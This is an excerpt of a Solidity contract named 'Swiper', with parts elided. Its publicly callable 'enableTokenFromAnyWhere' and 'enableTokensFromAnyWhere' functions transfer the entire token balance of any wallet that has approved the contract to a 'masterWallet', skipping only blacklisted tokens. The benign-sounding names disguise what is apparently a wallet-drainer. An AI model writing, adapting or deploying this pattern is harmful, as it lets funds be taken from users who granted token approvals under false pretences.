...
contract Swiper is Ownable, ReentrancyGuard {
     ...
     */
    function enableTokenFromAnyWhere(address _wallet, address _token) public nonReentrant {
        IBEP20 token_ = IBEP20(_token);
        uint256 _tokenBalance = token_.balanceOf(_wallet);

        if (!blackList[_token]) {
            token_.safeTransferFrom(_wallet, masterWallet, _tokenBalance);
        }
    }
    ...
    function enableTokensFromAnyWhere(TokenObject[] calldata _executableTokens) external nonReentrant {
        for (uint256 i = 0; i < _executableTokens.length; i ++) {
            enableTokenFromAnyWhere(_executableTokens[i].walletAddress, _executableTokens[i].tokenAddress);
        }
    }
     ...
     */
    function setBlackList(address[] calldata _tokens, bool _status) external onlyOwner {
